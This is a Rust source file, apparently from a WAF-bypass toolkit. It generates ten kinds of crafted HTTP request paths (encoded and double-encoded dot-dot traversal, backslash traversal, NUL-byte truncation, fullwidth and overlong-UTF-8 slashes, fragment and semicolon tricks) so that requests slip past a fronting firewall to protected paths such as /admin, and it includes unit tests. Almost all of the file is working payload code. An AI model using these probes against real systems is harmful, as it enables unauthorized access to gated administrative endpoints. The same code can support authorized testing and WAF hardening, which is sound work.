//! HTTP request-path parser-differential probes — exploit
//! normalization disagreements between a fronting WAF and the backend
//! origin.
//!
//! Every probe generates a `:path` pseudo-header (HTTP/2 style) whose
//! byte form differs from a canonical protected path. A WAF that gates
//! `/admin` by literal-string match will let the variant through; a
//! backend that normalizes will route the request to the real handler.
//!
//! The pseudo-header naming convention (`:path`) is used because the
//! existing `SmuggleArtifact::Headers` variant maps cleanly to HTTP/2
//! semantics, and operators consuming the JSON immediately understand
//! to splice the value into the request line for HTTP/1.1 transports.
//!
//! Each probe produces ONE `(":path", "<crafted-path>")` header pair.
//! Splice into the outgoing HTTP/2 request directly, or use the path
//! value as the request-line target for HTTP/1.1.

use wafrift_types::canary::Canary;
use wafrift_types::pick::pick_from;
use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};

/// Which path-normalization differential to emit. Each variant maps
/// to a known WAF/origin disagreement on URL-path interpretation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PathNormalizeTechnique {
    /// `/safe/%2e%2e/<target>` — URL-encoded dot-dot traversal.
    /// Bypasses WAFs that scan only for literal `../`.
    DotSegmentEncoded,
    /// `/safe/%252e%252e/<target>` — double-encoded dot-dot.
    /// Bypasses single-decode WAFs that see literal `%25...`.
    DoubleEncodedDotSegment,
    /// `/safe/%2e./<target>` — mixed encoded + literal dot.
    /// Bypasses one-pass normalizers that miss the hybrid form.
    MixedDotEncoding,
    /// `/safe/..\<target>` — Windows-style backslash separator.
    /// IIS / some Tomcat treat `\` as a path separator; many WAFs
    /// normalize only forward slashes.
    BackslashTraversal,
    /// `/<target>%00/safe.html` — NUL-byte truncation.
    /// C-string-based filters truncate at NUL; URL-aware backends
    /// keep the full path and route to `/<target>`.
    NullByteTruncation,
    /// `////<target>` — multi-slash run.
    /// Some proxies collapse, some don't — a per-segment ACL gate
    /// that counts segments by literal slash will undercount.
    MultiSlashCollapse,
    /// `/safe#/<target>` — fragment-leaked path.
    /// Backends strip fragment before routing; some WAFs split before
    /// normalization and see only `/safe`.
    FragmentLeak,
    /// `/<target>;jsessionid=evil` — RFC 3986 path parameter suffix.
    /// Some WAFs normalize the path-param suffix away (matching
    /// `/<target>`) while others keep it and miss the gate.
    SemicolonPathParam,
    /// `/<U+FF0F><target>` — fullwidth solidus (visually a `/`).
    /// Backends that NFKC-normalize the URL see `/admin`; WAFs that
    /// don't see a 3-byte UTF-8 sequence and pass.
    UnicodeFullwidthSlash,
    /// `/%c0%af<target>` — overlong UTF-8 encoding of `/`.
    /// Forbidden by RFC 3629 but accepted by lenient parsers
    /// (pre-2.2.x Apache, old IIS, some Tomcat versions).
    OverlongUtf8Slash,
}

impl PathNormalizeTechnique {
    /// Stable kebab-case technique name. Used in JSON output and
    /// telemetry — operators key on this for reproducibility.
    #[must_use]
    pub fn technique_name(&self) -> &'static str {
        match self {
            Self::DotSegmentEncoded => "path.dot-segment-encoded",
            Self::DoubleEncodedDotSegment => "path.double-encoded-dot-segment",
            Self::MixedDotEncoding => "path.mixed-dot-encoding",
            Self::BackslashTraversal => "path.backslash-traversal",
            Self::NullByteTruncation => "path.null-byte-truncation",
            Self::MultiSlashCollapse => "path.multi-slash-collapse",
            Self::FragmentLeak => "path.fragment-leak",
            Self::SemicolonPathParam => "path.semicolon-path-param",
            Self::UnicodeFullwidthSlash => "path.unicode-fullwidth-slash",
            Self::OverlongUtf8Slash => "path.overlong-utf8-slash",
        }
    }

    /// One-line operator description for logs and reports.
    #[must_use]
    pub fn description(&self) -> &'static str {
        match self {
            Self::DotSegmentEncoded => {
                "URL-encoded dot-dot traversal — bypasses literal `../` scanners"
            }
            Self::DoubleEncodedDotSegment => "Double-encoded dot-dot — bypasses single-decode WAFs",
            Self::MixedDotEncoding => "Mixed encoded + literal dot — bypasses one-pass normalizers",
            Self::BackslashTraversal => {
                "Windows backslash separator — IIS-style WAF/origin differential"
            }
            Self::NullByteTruncation => "NUL-byte truncation — splits WAF view from backend view",
            Self::MultiSlashCollapse => "Multi-slash run — segment-count differential",
            Self::FragmentLeak => "Fragment-in-path — WAFs that split early see wrong path",
            Self::SemicolonPathParam => "RFC 3986 path-param suffix — normalizer differential",
            Self::UnicodeFullwidthSlash => {
                "U+FF0F fullwidth solidus — visually a slash, byte-wise not"
            }
            Self::OverlongUtf8Slash => "Overlong UTF-8 `/` (%c0%af) — accepted by lenient parsers",
        }
    }
}

/// Safe-looking path-prefix pool. The probe wraps a `/safe/`-style
/// prefix around the traversal payload so a literal-prefix WAF rule
/// (e.g. "block any path starting with `/admin`") fires on the prefix
/// instead of the suffix-revealed admin path.
const SAFE_PREFIX_POOL: &[&str] = &["/safe", "/public", "/healthz", "/assets"];

/// One path-normalization smuggle probe.
#[derive(Debug, Clone)]
pub struct PathSmuggleProbe {
    /// Per-probe correlation token.
    pub canary: Canary,
    /// Which differential this probe emits.
    pub technique: PathNormalizeTechnique,
    /// Crafted `:path` value. Splice into the outgoing request line.
    pub path: String,
}

impl PathSmuggleProbe {
    /// Build a probe for a given technique + protected path.
    ///
    /// `protected_path` is the resource a WAF gates (typical:
    /// `/admin`). The probe rewrites it through the chosen
    /// normalization technique.
    #[must_use]
    pub fn new(technique: PathNormalizeTechnique, protected_path: &str) -> Self {
        let target = protected_path.trim_start_matches('/');
        let prefix = pick_from(SAFE_PREFIX_POOL, "/safe");
        let path = match technique {
            PathNormalizeTechnique::DotSegmentEncoded => {
                format!("{prefix}/%2e%2e/{target}")
            }
            PathNormalizeTechnique::DoubleEncodedDotSegment => {
                format!("{prefix}/%252e%252e/{target}")
            }
            PathNormalizeTechnique::MixedDotEncoding => {
                format!("{prefix}/%2e./{target}")
            }
            PathNormalizeTechnique::BackslashTraversal => {
                format!("{prefix}/..\\{target}")
            }
            PathNormalizeTechnique::NullByteTruncation => {
                format!("/{target}%00/{}", prefix.trim_start_matches('/'))
            }
            PathNormalizeTechnique::MultiSlashCollapse => {
                format!("////{target}")
            }
            PathNormalizeTechnique::FragmentLeak => {
                format!("{prefix}#/{target}")
            }
            PathNormalizeTechnique::SemicolonPathParam => {
                format!("/{target};jsessionid=wafrift")
            }
            PathNormalizeTechnique::UnicodeFullwidthSlash => {
                // U+FF0F = fullwidth solidus; UTF-8: EF BC 8F.
                format!("\u{FF0F}{target}")
            }
            PathNormalizeTechnique::OverlongUtf8Slash => {
                format!("/%c0%af{target}")
            }
        };
        Self {
            canary: Canary::generate(),
            technique,
            path,
        }
    }
}

impl SmuggleProbe for PathSmuggleProbe {
    fn canary(&self) -> &Canary {
        &self.canary
    }
    fn technique(&self) -> String {
        self.technique.technique_name().to_string()
    }
    fn description(&self) -> &str {
        self.technique.description()
    }
    fn artifact(&self) -> SmuggleArtifact {
        SmuggleArtifact::Headers(vec![(":path".to_string(), self.path.clone())])
    }
}

/// Every path-normalization smuggle variant against the given
/// protected path. Returns 10 probes — one per
/// [`PathNormalizeTechnique`] variant.
#[must_use]
pub fn all_variants(protected_path: &str) -> Vec<PathSmuggleProbe> {
    use PathNormalizeTechnique::*;
    [
        DotSegmentEncoded,
        DoubleEncodedDotSegment,
        MixedDotEncoding,
        BackslashTraversal,
        NullByteTruncation,
        MultiSlashCollapse,
        FragmentLeak,
        SemicolonPathParam,
        UnicodeFullwidthSlash,
        OverlongUtf8Slash,
    ]
    .iter()
    .map(|t| PathSmuggleProbe::new(*t, protected_path))
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    #[test]
    fn all_variants_emits_one_per_technique() {
        let probes = all_variants("/admin");
        assert_eq!(probes.len(), 10);
    }

    #[test]
    fn every_probe_uses_path_family_namespace() {
        for p in all_variants("/admin") {
            assert!(p.technique().starts_with("path."), "got {}", p.technique());
        }
    }

    #[test]
    fn every_probe_emits_pseudo_path_header() {
        for p in all_variants("/admin") {
            match p.artifact() {
                SmuggleArtifact::Headers(hs) => {
                    assert_eq!(hs.len(), 1);
                    assert_eq!(hs[0].0, ":path");
                    assert!(!hs[0].1.is_empty());
                }
                other => panic!("expected Headers, got {other:?}"),
            }
        }
    }

    #[test]
    fn dot_segment_encoded_contains_encoded_dot_dot() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::DotSegmentEncoded, "/admin");
        assert!(p.path.contains("%2e%2e"), "got {}", p.path);
        assert!(p.path.ends_with("admin"));
    }

    #[test]
    fn double_encoded_contains_double_percent() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::DoubleEncodedDotSegment, "/admin");
        assert!(p.path.contains("%252e%252e"), "got {}", p.path);
    }

    #[test]
    fn mixed_dot_encoding_contains_encoded_dot_then_literal_dot() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::MixedDotEncoding, "/admin");
        assert!(p.path.contains("%2e."), "got {}", p.path);
    }

    #[test]
    fn backslash_traversal_contains_backslash() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::BackslashTraversal, "/admin");
        assert!(p.path.contains('\\'), "got {}", p.path);
    }

    #[test]
    fn null_byte_variant_contains_percent_00() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::NullByteTruncation, "/admin");
        assert!(p.path.contains("%00"), "got {}", p.path);
    }

    #[test]
    fn multi_slash_variant_starts_with_quad_slash() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::MultiSlashCollapse, "/admin");
        assert!(p.path.starts_with("////"), "got {}", p.path);
    }

    #[test]
    fn fragment_variant_contains_hash() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::FragmentLeak, "/admin");
        assert!(p.path.contains('#'), "got {}", p.path);
    }

    #[test]
    fn semicolon_variant_contains_semicolon_param() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::SemicolonPathParam, "/admin");
        assert!(p.path.contains(';'), "got {}", p.path);
        assert!(p.path.contains("jsessionid"));
    }

    #[test]
    fn unicode_fullwidth_variant_contains_ff0f_bytes() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::UnicodeFullwidthSlash, "/admin");
        // U+FF0F in UTF-8 is EF BC 8F.
        let bytes = p.path.as_bytes();
        assert!(
            bytes.windows(3).any(|w| w == [0xEF, 0xBC, 0x8F]),
            "got bytes {bytes:?}"
        );
    }

    #[test]
    fn overlong_utf8_variant_contains_c0_af() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::OverlongUtf8Slash, "/admin");
        assert!(p.path.contains("%c0%af"), "got {}", p.path);
    }

    #[test]
    fn canaries_are_unique_per_probe() {
        let probes = all_variants("/admin");
        let tokens: HashSet<String> = probes.iter().map(|p| p.canary().token.clone()).collect();
        assert_eq!(tokens.len(), probes.len());
    }

    #[test]
    fn descriptions_are_non_empty_and_distinct() {
        let probes = all_variants("/admin");
        let descs: HashSet<&str> = probes.iter().map(|p| p.description()).collect();
        assert_eq!(descs.len(), probes.len(), "descriptions must be distinct");
        for p in &probes {
            assert!(!p.description().is_empty());
        }
    }

    #[test]
    fn technique_names_are_distinct() {
        let probes = all_variants("/admin");
        let techs: HashSet<String> = probes.iter().map(|p| p.technique()).collect();
        assert_eq!(
            techs.len(),
            probes.len(),
            "technique names must be distinct"
        );
    }

    #[test]
    fn custom_protected_path_appears_in_artifact() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::DotSegmentEncoded, "/wp-admin");
        assert!(p.path.contains("wp-admin"), "got {}", p.path);
    }

    #[test]
    fn protected_path_without_leading_slash_still_works() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::DotSegmentEncoded, "admin");
        assert!(p.path.contains("admin"));
    }

    #[test]
    fn probe_canary_token_is_sixteen_chars() {
        let p = PathSmuggleProbe::new(PathNormalizeTechnique::DotSegmentEncoded, "/admin");
        assert_eq!(p.canary().token.len(), 16);
    }
}
